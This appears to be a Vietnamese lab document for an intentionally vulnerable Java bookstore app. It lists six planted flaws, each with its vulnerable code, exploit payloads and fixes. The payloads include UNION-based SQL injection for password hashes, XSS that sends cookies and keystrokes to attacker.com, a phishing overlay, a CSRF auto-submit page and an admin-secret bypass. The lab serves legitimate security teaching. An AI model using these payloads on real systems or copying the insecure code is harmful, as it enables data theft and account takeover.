# 🔓 Danh sách lỗ hổng bảo mật - JVA Bookstore

> **⚠️ CẢNH BÁO:** Các lỗ hổng này được tạo **CỐ Ý** cho mục đích thực hành Lab An toàn Web.
> Tuyệt đối **KHÔNG** triển khai lên môi trường production.

---

## Tổng quan

| # | Loại lỗ hổng | Mức độ | File bị ảnh hưởng | CWE |
|---|---|---|---|---|
| 1 | SQL Injection | 🔴 Nghiêm trọng | `BookDAO.java`, `BooksApiServlet.java` | CWE-89 |
| 2 | Stored XSS | 🔴 Nghiêm trọng | `CommentDAO.java`, `book-detail.jsp` | CWE-79 |
| 3 | Reflected XSS | 🟠 Cao | `BooksApiServlet.java` | CWE-79 |
| 4 | IDOR | 🟠 Cao | `ProfileServlet.java` | CWE-639 |
| 5 | CSRF | 🟡 Trung bình | `login.jsp` (toàn bộ form) | CWE-352 |
| 6 | Hardcoded Secret | 🟡 Trung bình | `JwtFilter.java` | CWE-798 |

---

## 1. 🔴 SQL Injection

### Mô tả
Hàm `searchBooksUnsafe()` trong `BookDAO.java` nối chuỗi trực tiếp input của người dùng vào câu truy vấn SQL mà **không sử dụng PreparedStatement** hay bất kỳ biện pháp sanitize nào.

### File bị ảnh hưởng
- `src/main/java/dao/BookDAO.java` — method `searchBooksUnsafe()`
- `src/main/java/web/BooksApiServlet.java` — method `handleSearch()` gọi `searchBooksUnsafe()`

### Endpoint
```
GET /api/books/search?q=<PAYLOAD>
```

### Payload khai thác
```
# Trả về tất cả sách (bypass điều kiện WHERE)
/api/books/search?q=' OR '1'='1' --

# Lấy thông tin từ bảng users (UNION-based)
/api/books/search?q=' UNION SELECT null,username,email,null,null,password_hash,null,0,null,null,null,null,null,null,0,0,0,0 FROM users --

# Time-based blind injection
/api/books/search?q=' OR pg_sleep(5) --
```

### Code lỗi
```java
// BookDAO.java - Nối chuỗi trực tiếp
String sql = BASE_SELECT +
    " WHERE b.status = 'active' AND (b.title ILIKE '%" + keyword + "%' ...)" +
    " ORDER BY b.created_at DESC LIMIT " + limit;
Statement statement = connection.createStatement();
ResultSet rs = statement.executeQuery(sql);
```

### Cách khắc phục
Sử dụng `PreparedStatement` với tham số `?`:
```java
String sql = BASE_SELECT + " WHERE b.title ILIKE ? ...";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setString(1, "%" + keyword + "%");
```

---

## 2. 🔴 Stored XSS (Cross-Site Scripting)

### Mô tả
Nội dung comment/bình luận được lưu vào database **không qua sanitize**, và khi hiển thị trên trang chi tiết sách, nội dung được render **trực tiếp không escape HTML**. Kẻ tấn công có thể chèn mã JavaScript độc hại.

### File bị ảnh hưởng
- `src/main/java/dao/CommentDAO.java` — method `addComment()` (đã bỏ kiểm tra input)
- `src/main/webapp/book-detail.jsp` — dòng 265-266 (render `${r.comment}` không escape)

### Endpoint
```
POST /api/comments
Content-Type: application/json

{
  "bookId": 1,
  "content": "<script>alert('XSS')</script>"
}
```

### Payload khai thác
```html
<!-- Alert đơn giản -->
<script>alert('XSS')</script>

<!-- Đánh cắp cookie -->
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

<!-- Keylogger -->
<script>document.onkeypress=function(e){fetch('https://attacker.com/log?k='+e.key)}</script>

<!-- Chèn form giả mạo -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  <h2>Phiên đăng nhập hết hạn</h2>
  <form action="https://attacker.com/phish">
    <input name="username" placeholder="Username">
    <input name="password" type="password" placeholder="Password">
    <button>Đăng nhập lại</button>
  </form>
</div>
```

### Code lỗi
```jsp
<%-- book-detail.jsp - Render trực tiếp không escape --%>
${r.comment}

<%-- Đáng lẽ phải dùng: --%>
<c:out value="${r.comment}" />
```

### Cách khắc phục
1. Escape output: sử dụng `<c:out>` hoặc `fn:escapeXml()` trong JSP
2. Validate/sanitize input trên server: giới hạn ký tự, loại bỏ thẻ HTML
3. Sử dụng Content-Security-Policy header

---

## 3. 🟠 Reflected XSS

### Mô tả
Khi từ khóa tìm kiếm quá ngắn (< 2 ký tự), server trả về **HTML response** chứa giá trị input của người dùng **không được escape**. Kẻ tấn công có thể tạo URL chứa mã JavaScript và gửi cho nạn nhân.

### File bị ảnh hưởng
- `src/main/java/web/BooksApiServlet.java` — method `handleSearch()`

### Endpoint
```
GET /api/books/search?q=<PAYLOAD>
```

### Payload khai thác
```
/api/books/search?q=<script>alert(document.cookie)</script>

/api/books/search?q=<img src=x onerror="alert('XSS')">

/api/books/search?q=<svg onload="fetch('https://attacker.com/steal?c='+document.cookie)">
```

### Code lỗi
```java
// BooksApiServlet.java - Phản hồi HTML chứa input chưa escape
resp.setContentType("text/html; charset=UTF-8");
resp.getWriter().write("<html><body><h3>Kết quả tìm kiếm cho: " + keyword + "</h3>...");
```

### Cách khắc phục
1. Escape HTML đặc biệt: `&`, `<`, `>`, `"`, `'`
2. Trả về JSON thay vì HTML
3. Sử dụng thư viện như OWASP Java Encoder

---

## 4. 🟠 IDOR (Insecure Direct Object Reference)

### Mô tả
Endpoint `/api/profile/user-info` cho phép xem thông tin **bất kỳ user nào** bằng cách truyền `userId` qua parameter. Server **không kiểm tra** xem người yêu cầu có quyền xem thông tin user đó hay không.

### File bị ảnh hưởng
- `src/main/java/web/ProfileServlet.java` — method `getAnyUserProfile()`

### Endpoint
```
GET /api/profile/user-info?userId=<ID>
```

### Payload khai thác
```bash
# Xem thông tin user id=1 (có thể là admin)
curl -H "Authorization: Bearer <YOUR_TOKEN>" \
     "http://localhost:8081/api/profile/user-info?userId=1"

# Duyệt tuần tự tất cả users (enumeration)
for i in $(seq 1 100); do
  curl -s "http://localhost:8081/api/profile/user-info?userId=$i"
done
```

### Dữ liệu bị lộ
```json
{
  "success": true,
  "user": {
    "id": 1,
    "username": "admin",
    "email": "admin@bookstore.vn",
    "fullName": "Quản trị viên",
    "phone": "0901234567",
    "role": "admin",
    "status": "active",
    "createdAt": "2024-01-01T00:00:00"
  }
}
```

### Cách khắc phục
Kiểm tra `userId` từ token phải khớp với `userId` được yêu cầu, hoặc kiểm tra role admin:
```java
Long loggedInUserId = AuthUtil.resolveUserId(request);
if (!loggedInUserId.equals(targetUserId) && !"admin".equals(userRole)) {
    return 403 Forbidden;
}
```

---

## 5. 🟡 CSRF (Cross-Site Request Forgery)

### Mô tả
Tất cả các form trong ứng dụng (login, đăng ký, đổi mật khẩu, đặt hàng...) **không sử dụng CSRF token**. Kẻ tấn công có thể tạo trang web độc hại chứa form tự động submit đến ứng dụng.

### File bị ảnh hưởng
- `src/main/webapp/login.jsp` — form login không có CSRF token
- Toàn bộ API không kiểm tra CSRF token

### Payload khai thác
Tạo file HTML trên server của kẻ tấn công:
```html
<!-- csrf_attack.html - Trang web độc hại -->
<html>
<body>
  <h1>Bạn đã trúng thưởng! Nhấn để nhận quà</h1>
  <form id="csrf" action="http://localhost:8081/api/profile" method="POST">
    <input type="hidden" name="fullName" value="HACKED">
    <input type="hidden" name="phone" value="0000000000">
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### Cách khắc phục
1. Tạo CSRF token cho mỗi session và gắn vào form
2. Kiểm tra CSRF token ở server trước khi xử lý request
3. Sử dụng `SameSite` cookie attribute

---

## 6. 🟡 Hardcoded Secret

### Mô tả
Admin panel secret key được **hardcode trực tiếp** trong mã nguồn với giá trị mặc định `"dev-secret-key-change-me"`. Kẻ tấn công có thể đọc source code hoặc dùng giá trị mặc định để bypass authentication cho admin API.

### File bị ảnh hưởng
- `src/main/java/filters/JwtFilter.java` — method `getAdminSecret()`, dòng 148

### Code lỗi
```java
private String getAdminSecret() {
    String env = System.getenv("ADMIN_PANEL_SECRET");
    if (env != null) { ... return env; }
    return "dev-secret-key-change-me";  // ← HARDCODED SECRET
}
```

### Payload khai thác
```bash
# Truy cập admin orders API bằng secret key hardcoded
curl "http://localhost:8081/api/admin/orders?secret=dev-secret-key-change-me"

# Hoặc qua header
curl -H "X-Admin-Secret: dev-secret-key-change-me" \
     "http://localhost:8081/api/admin/orders"
```

### Cách khắc phục
1. Luôn sử dụng biến môi trường (environment variable) cho secret
2. Không có giá trị fallback mặc định
3. Sử dụng key vault hoặc secret manager

---

## Tổng kết

| Lỗ hổng | Loại tấn công | Hậu quả |
|---|---|---|
| SQL Injection | Injection | Đọc/sửa/xóa toàn bộ database |
| Stored XSS | Client-side | Đánh cắp session, phishing, defacement |
| Reflected XSS | Client-side | Đánh cắp cookie, redirect nạn nhân |
| IDOR | Broken Access Control | Lộ thông tin cá nhân tất cả users |
| CSRF | Session Riding | Thực hiện hành động thay nạn nhân |
| Hardcoded Secret | Security Misconfiguration | Bypass xác thực admin panel |
